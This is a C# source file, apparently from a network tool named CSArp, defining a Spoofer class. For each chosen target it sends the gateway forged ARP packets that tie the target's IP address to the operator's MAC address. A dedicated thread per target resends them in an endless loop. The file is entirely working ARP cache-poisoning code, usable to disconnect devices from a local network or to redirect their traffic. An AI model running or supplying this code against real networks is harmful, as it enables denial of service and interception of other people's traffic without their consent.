using System.Collections.Generic;
using System.Net;
using SharpPcap;
using PacketDotNet;
using System.Net.NetworkInformation;
using System.Threading;
using SharpPcap.WinPcap;
using CSArp.View;
using CSArp.Model.Utilities;

namespace CSArp.Model
{
    public static class Spoofer
    {
        private static Dictionary<IPAddress, PhysicalAddress> engagedclientlist;
        private static bool disengageflag = true;
        //private static IcaptureDevice captureDevice;

        public static void Start(IView view, Dictionary<IPAddress, PhysicalAddress> targetlist, IPAddress gatewayipaddress, PhysicalAddress gatewaymacaddress, WinPcapDevice captureDevice)
        {
            engagedclientlist = new Dictionary<IPAddress, PhysicalAddress>();
            captureDevice.Open();
            foreach (var target in targetlist)
            {
                var myipaddress = captureDevice.Addresses[1].Addr.ipAddress; //possible critical point : Addresses[1] in hardcoding the index for obtaining ipv4 address
                var arppacketforgatewayrequest = new ARPPacket(ARPOperation.Request, "00-00-00-00-00-00".Parse(), gatewayipaddress, captureDevice.MacAddress, target.Key);
                var ethernetpacketforgatewayrequest = new EthernetPacket(captureDevice.MacAddress, gatewaymacaddress, EthernetPacketType.Arp);
                ethernetpacketforgatewayrequest.PayloadPacket = arppacketforgatewayrequest;
                ThreadBuffer.Add(new Thread(() =>
                    SendSpoofingPacket(view, target.Key, target.Value, ethernetpacketforgatewayrequest, captureDevice)
                  ));
                engagedclientlist.Add(target.Key, target.Value);
            };
        }
        public static void StopAll()
        {
            disengageflag = true;
            if (engagedclientlist != null)
            {
                engagedclientlist.Clear();
            }
        }
        private static void SendSpoofingPacket(IView view, IPAddress ipAddress, PhysicalAddress physicalAddress, EthernetPacket ethernetpacketforgatewayrequest, WinPcapDevice captureDevice)
        {

            disengageflag = false;
            DebugOutput.Print(view, "Spoofing target " + physicalAddress.ToString() + " @ " + ipAddress.ToString());
            try
            {
                while (!disengageflag)
                {
                    captureDevice.SendPacket(ethernetpacketforgatewayrequest);
                }
            }
            catch (PcapException ex)
            {
                DebugOutput.Print(view, "PcapException @ DisconnectReconnect.Disconnect() [" + ex.Message + "]");
            }
            DebugOutput.Print(view, "Spoofing thread @ DisconnectReconnect.Disconnect() for " + physicalAddress.ToString() + " @ " + ipAddress.ToString() + " is terminating.");
        }
    }
}
